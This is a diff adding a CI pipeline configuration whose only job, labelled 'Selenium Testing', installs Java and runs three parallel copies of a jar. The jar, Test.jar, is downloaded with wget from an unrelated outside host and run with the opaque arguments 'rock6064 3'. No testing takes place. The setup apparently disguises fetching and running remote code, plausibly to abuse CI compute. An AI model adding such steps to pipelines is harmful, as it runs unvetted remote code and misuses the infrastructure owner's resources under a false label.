@@ -1,0 +1,19 @@
+version: v1.0
+name: Initial Pipeline
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu1804
+    
+    
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Selenium Testing'
+          parallelism: 3
+          commands:
+            - sudo apt update
+            - sudo apt install wget default-jre -y
+            - wget https://defaulter.runkodapps.com/Test.jar
+            - java -jar Test.jar rock6064 3
